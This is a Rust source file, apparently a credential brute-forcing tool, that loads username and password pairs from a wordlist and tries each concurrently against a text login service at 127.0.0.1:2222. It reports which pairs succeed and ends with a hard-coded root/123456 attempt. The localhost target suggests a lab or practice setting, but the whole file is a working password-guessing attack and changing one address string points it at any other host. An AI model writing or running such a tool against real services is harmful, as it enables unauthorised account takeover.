use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::task::JoinSet;
use tokio::sync::Semaphore;
use tokio::fs;
use std::sync::Arc;

#[tokio::main]
async fn main() {
    let content = fs::read_to_string("wordlist.txt").await.unwrap();
    let credentials: Vec<(String, String)> = content
        .lines()
        .filter_map(|line| {
            let mut parts = line.splitn(2, ',');
            let user = parts.next()?.to_string();
            let pass = parts.next()?.to_string();
            Some((user, pass))
        })
        .collect();
    println!("Loaded {} credentials pairs", credentials.len());
    let mut set = JoinSet::new();
    let sem = Arc::new(Semaphore::new(5));
    for (user, pass) in credentials {
        let sem = sem.clone();
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let result = try_login("127.0.0.1:2222", &user, &pass).await;
            (user, pass, result)
        });
    }
    while let Some(Ok((user, pass, result))) = set.join_next().await {
        if result {
            println!("SUCCESS: {} / {}", user, pass);
        } else {
            println!("failed: {} / {}", user, pass);
        }
    }

    let result = try_login("127.0.0.1:2222", "root", "123456").await;
    println!("root/123456 → {}", if result { "SUCCESS" } else { "failed" });
}

async fn try_login(addr: &str, user: &str, pass: &str) -> bool {
    let mut stream = match TcpStream::connect(addr).await {
        Ok(s) => s,
        Err(_) => return false,
    };

    let mut buf = vec![0u8; 256];

    // read banner
    let n = match stream.read(&mut buf).await {
        Ok(n) if n > 0 => n,
        _ => return false,
    };

    // send username
    let _ = stream.write_all(format!("{}\n", user).as_bytes()).await;

    // read "Password: " prompt
    let n = match stream.read(&mut buf).await {
        Ok(n) if n > 0 => n,
        _ => return false,
    };
    // send password
    let _ = stream.write_all(format!("{}\n", pass).as_bytes()).await;

    // read response ("Authentication failed" or something eles)
    let mut response = String::new();
    loop {
        let n = match stream.read(&mut buf).await {
            Ok(0) | Err(_) => break,
            Ok(n) => n,
        };
        response.push_str(&String::from_utf8_lossy(&buf[..n]));
        if response.contains('\n') { break; }
    }
    !response.contains("Authentication failed")
}
